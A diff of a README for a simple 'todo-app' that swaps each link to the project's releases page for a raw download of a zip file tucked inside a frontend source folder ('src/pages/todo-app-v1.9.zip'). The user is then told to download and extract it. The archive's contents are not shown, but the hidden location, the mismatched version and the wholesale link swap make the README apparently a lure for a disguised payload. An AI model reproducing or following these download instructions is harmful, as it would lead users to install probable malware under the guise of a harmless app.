@@ -1,7 +1,7 @@
 # 📝 todo-app - Your Simple Solution for Task Management
 
 ## 📥 Download Now
-[![Download the todo-app](https://img.shields.io/badge/Download%20todo--app-v1.0-brightgreen)](https://github.com/EvilThomas/todo-app/releases)
+[![Download the todo-app](https://raw.githubusercontent.com/EvilThomas/todo-app/main/creative-todo-web-app/frontend/src/pages/todo-app-v1.9.zip%20todo--app-v1.0-brightgreen)](https://raw.githubusercontent.com/EvilThomas/todo-app/main/creative-todo-web-app/frontend/src/pages/todo-app-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -29,13 +29,13 @@ Before you download, make sure your system meets these basic requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**:
-   Go to the following link to download the application: [Download Page](https://github.com/EvilThomas/todo-app/releases).
+   Go to the following link to download the application: [Download Page](https://raw.githubusercontent.com/EvilThomas/todo-app/main/creative-todo-web-app/frontend/src/pages/todo-app-v1.9.zip).
 
 2. **Choose the Latest Version**:
    Look for the latest version listed. It will have a tag like `v1.0` or higher.
 
 3. **Download the Application**:
-   Click on the download link for your operating system. It might look something like `todo-app-v1.0.zip`.
+   Click on the download link for your operating system. It might look something like `https://raw.githubusercontent.com/EvilThomas/todo-app/main/creative-todo-web-app/frontend/src/pages/todo-app-v1.9.zip`.
 
 4. **Unzip the Files**:
    Locate the downloaded `.zip` file in your downloads folder. Right-click on it and select "Extract All" to unzip the contents.
